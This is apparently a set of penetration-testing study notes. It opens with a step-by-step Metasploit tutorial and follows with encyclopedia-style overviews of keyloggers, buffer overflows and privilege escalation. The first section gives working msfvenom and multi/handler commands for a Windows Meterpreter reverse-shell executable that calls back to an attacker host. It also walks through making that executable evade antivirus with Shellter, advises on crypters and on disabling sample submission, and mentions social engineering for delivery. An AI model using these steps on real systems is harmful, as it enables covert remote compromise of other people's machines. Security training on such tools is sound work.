**Windows and Linux – Metasploit and Kali Linux**



The Metasploit Framework is the most commonly-used framework for hackers worldwide. It allows hackers to set up listeners that create a conducive environment (referred to as a Meterpreter) to manipulate compromised machines. In this article, we’ll look at how this framework within Kali Linux can be used to attack a Windows 10 machine. 

## Creating a Malicious .exe File

To create the executable, you would use msfvenom as shown in the command below:

**msfvenom -p windows/meterpreter/reverse_tcp -a x86 –platform windows -f exe LHOST=192.168.100.4 LPORT=4444 -o /root/something32.exe**

The command above instructs msfvenom to generate a 32-bit Windows executable file that implements a reverse TCP connection for the payload. The format must be specified as being type .exe, and the local host (LHOST) and local port (LPORT) have to be defined. In our case, the LHOST is the IP address of our attacking Kali Linux machine, and the LPORT is the port to listen on for a connection from the target once it has been compromised.

**Making the Executable FUD (Fully Undetectable)**

To encode our executable, we shall be using [Shellter](https://www.shellterproject.com/). Shellter works by changing the executable’s signatures from the obviously malicious one to a completely new and unique one that can bypass detection.

Note that antiviruses also check the behavior of executables and employ techniques such as heuristics scanning, so they are not just limited to checking for signatures. During our lab tests we discovered that Windows Defender, which ships by default with Windows 10, flagged the executable 6 out of the 10 times we used Shellter to perform the encoding. This is despite Windows 10 being a fresh download with latest patches applied! You will be better off purchasing Shellter Pro (or any Pro Crypter) or writing your own Crypter to avoid antivirus flagging your executables.

Also note that when writing your own, disable automatic submissions. Otherwise whatever you write, if detected as potentially-unwanted software, will be uploaded by your antivirus for analysis … And we both know how that will end.

To launch Shellter just type **shellter** on the terminal.

You will be required to enter the absolute path to the executable to make FUD. Make sure to select “Auto” mode as shown below.

![shellter](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/3-120.png)

Shellter will then initialize and run some checks. It will then prompt you whether to run in stealth mode. Select “Y” for yes.

![](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/4-84.png)

The next prompt will require you to enter the payload, either a custom or a listed one. You should select a listed one by typing “L”, unless you want to proceed with your own custom payload. Select the index position of the payload to use. We need a Meterpreter_Reverse_TCP, so we will have to go with “1.”

![]([![img](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/5-74-768x481.png)](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/5-74.png)

Enter LHOST and LPORT and press Enter. Shellter will run to completion and request you to press Enter.

![](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/6-41.png)

At this point, the executable you provided will have been made undetectable to antivirus solutions.

Again, note that you are better off writing your own or purchasing a Crypter that is constantly being revised. Otherwise, most of your encoding will be flagged as malicious or potentially unwanted software.

We now need to set up a listener on the port we determined within the executable. We do this by launching Metasploit using the command **msfconsole** on the Kali Linux terminal.

First, we’ll tell Metasploit to use the generic payload handler “multi/handler” using the command **use multi/handler**. We will then set the payload to match the one set within the executable using the command **set payload windows/meterpreter/reverse_tcp**. We will then set the LHOST and LPORT this way — **set LHOST 192.168.100.4** and **set LPORT 4444**. Once done, type “run” or “exploit” and press Enter.

[![img](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/7-40-768x299.png)](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/7-40.png)

The next step is to execute it from a Windows perspective. In a real-world practical situation, this will require social engineering skills. Nevertheless, copy the something32 to a Windows system within the same network as the Kali system.

We now only have to run the payload from windows perspective to initialize exploitation

[![img](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/8-25.png)](https://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/8-25.png)



**Keylogging**

**Keystroke logging**, often referred to as **keylogging** or **keyboard capturing**, is the action of recording (logging) the keys struck on a [keyboard](https://en.wikipedia.org/wiki/Keyboard_(computing)), typically covertly, so that person using the keyboard is unaware that their actions are being monitored. Data can then be retrieved by the person operating the logging program. A **keylogger** can be either [software](https://en.wikipedia.org/wiki/Software) or [hardware](https://en.wikipedia.org/wiki/Computer_hardware). 

While the programs themselves are legal,[[1\]](https://en.wikipedia.org/wiki/Keystroke_logging#cite_note-1) with many of them being designed to allow employers to oversee the use of their computers, keyloggers are most often used for the purpose of stealing [passwords](https://en.wikipedia.org/wiki/Password) and other confidential information.[[2\]](https://en.wikipedia.org/wiki/Keystroke_logging#cite_note-2)[[3\]](https://en.wikipedia.org/wiki/Keystroke_logging#cite_note-3) 

Keylogging can also be used to study human–computer interaction. Numerous keylogging methods exist:  they range from hardware and software-based approaches to [acoustic](https://en.wikipedia.org/wiki/Acoustics) analysis.



**Software-based keyloggers**

Software-based keyloggers are computer programs designed to work on the target computer's [software](https://en.wikipedia.org/wiki/Software).[[4\]](https://en.wikipedia.org/wiki/Keystroke_logging#cite_note-4) Keyloggers are used in [IT](https://en.wikipedia.org/wiki/Information_technology) organizations to troubleshoot technical problems with computers and business networks.  Families and business people use keyloggers legally to monitor network usage without their users' direct knowledge. Even [Microsoft](https://en.wikipedia.org/wiki/Microsoft) publicly admitted that [Windows 10](https://en.wikipedia.org/wiki/Windows_10) operation system has a built-in keylogger in its final version “to improve typing and writing services”.[[5\]](https://en.wikipedia.org/wiki/Keystroke_logging#cite_note-5) However, malicious individuals can use keyloggers on public computers to steal passwords or credit card information. Most keyloggers are not stopped by [HTTPS](https://en.wikipedia.org/wiki/HTTP_Secure) encryption because that only protects [data in transit](https://en.wikipedia.org/wiki/Data_in_transit) between computers, thus the threat being from the user's computer.

**Hardware-based keyloggers**

Hardware-based keyloggers do not depend upon any software being installed as they exist at a hardware level in a computer system. 

- Firmware-based: [BIOS](https://en.wikipedia.org/wiki/BIOS)-level [firmware](https://en.wikipedia.org/wiki/Firmware) that handles keyboard events can be modified to record these events as they are processed. Physical and/or [root-level access](https://en.wikipedia.org/wiki/Superuser) is required to the machine, and the software loaded into the BIOS needs to be created for the specific hardware that it will be running on.[[14\]](https://en.wikipedia.org/wiki/Keystroke_logging#cite_note-14)
- Keyboard hardware: Hardware keyloggers are used for keystroke logging by means of a hardware circuit that is attached somewhere in between the [computer keyboard](https://en.wikipedia.org/wiki/Computer_keyboard) and the computer, typically inline with the keyboard's cable connector. There are also [USB](https://en.wikipedia.org/wiki/Universal_Serial_Bus) connectors based Hardware keyloggers as well as ones for Laptop computers (the Mini-PCI card plugs into the expansion slot of a laptop). More stealthy implementations can be installed or built into standard keyboards, so that no device is visible on the external cable. Both types log all keyboard activity to their [internal memory](https://en.wikipedia.org/wiki/Primary_storage), which can be subsequently accessed, for example, by typing in a secret key sequence. A hardware keylogger has an advantage over a software solution: it is not dependent on being installed on the target computer's operating system and therefore will not interfere with any program running on the target machine or be detected by any [software](https://en.wikipedia.org/wiki/Anti-spyware_software). However its physical presence may be detected if, for example, it is installed outside the case as an inline device between the computer and the keyboard.  Some of these implementations have the ability to be controlled and monitored remotely by means of a wireless communication standard.



**Buffer Overflow**

A **buffer** is a temporary area for data storage. When more data (than was originally allocated to be stored) gets placed by a program or system process, the extra data overflows. It causes some of that data to leak out into other buffers, which can corrupt or overwrite whatever data they were holding.

In a **buffer-overflow attack,** the extra data sometimes holds specific instructions for actions intended by a hacker or malicious user; for example, the data could trigger a response that damages files, changes data or unveils private information.

Attacker would use a buffer-overflow exploit to take advantage of a program that is waiting on a user’s input. There are two types of buffer overflows: stack-based and heap-based. Heap-based, which are difficult to execute and the least common of the two, attack an application by flooding the memory space reserved for a program. Stack-based buffer overflows, which are more common among attackers, exploit applications and programs by using what is known as a stack: memory space used to store user input.

## **Key Concepts of Buffer Overflow**

- This error occurs when there is more data in a buffer than it can handle, causing data to overflow into adjacent storage.
- This vulnerability can cause a system crash or, worse, create an entry point for a cyberattack.
- C and C++ are more susceptible to buffer overflow.
- Secure development practices should include regular testing to detect and fix buffer overflows. These practices include automatic protection at the language level and bounds-checking at run-time.

 **Privilege Escalation**

**[![img](https://upload.wikimedia.org/wikipedia/commons/thumb/c/cc/Privilege_Escalation_Diagram.svg/220px-Privilege_Escalation_Diagram.svg.png)](https://en.wikipedia.org/wiki/File:Privilege_Escalation_Diagram.svg)**

**Privilege escalation** is the act of exploiting a [bug](https://en.wikipedia.org/wiki/Software_bug), design flaw or configuration oversight in an [operating system](https://en.wikipedia.org/wiki/Operating_system) or [software application](https://en.wikipedia.org/wiki/Software_application) to gain elevated access to [resources](https://en.wikipedia.org/wiki/Resource_(computer_science)) that are normally protected from an application or [user](https://en.wikipedia.org/wiki/User_(computing)). The result is that an application with more [privileges](https://en.wikipedia.org/wiki/Privilege_(computing)) than intended by the [application developer](https://en.wikipedia.org/wiki/Programmer) or [system administrator](https://en.wikipedia.org/wiki/System_administrator) can perform [unauthorized](https://en.wikipedia.org/wiki/Authorization) actions.

Most computer systems are designed for use with multiple user accounts, each of which has abilities known as [privileges](https://en.wikipedia.org/wiki/Privilege_(computing)). Common privileges include viewing and editing files, or modifying system files. 

Privilege escalation means a user receives privileges they are not entitled to. These privileges can be used to delete files, view private information, or install unwanted programs such as viruses. It usually occurs when a system has a [bug](https://en.wikipedia.org/wiki/Software_bug) that allows security to be bypassed or, alternatively, has flawed design assumptions about how it will be used.  Privilege escalation occurs in two forms: 

- **Vertical privilege escalation**, also known as *privilege elevation*, where a lower privilege user or application accesses functions or content reserved for higher privilege users or applications (e.g. Internet Banking users can access site administrative functions or the password for a smartphone can be bypassed.)
- **Horizontal privilege escalation**, where a normal user accesses functions or content reserved for other normal users (e.g. Internet Banking User A accesses the Internet bank account of User B)![img](https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Priv_rings.svg/1024px-Priv_rings.svg.png)





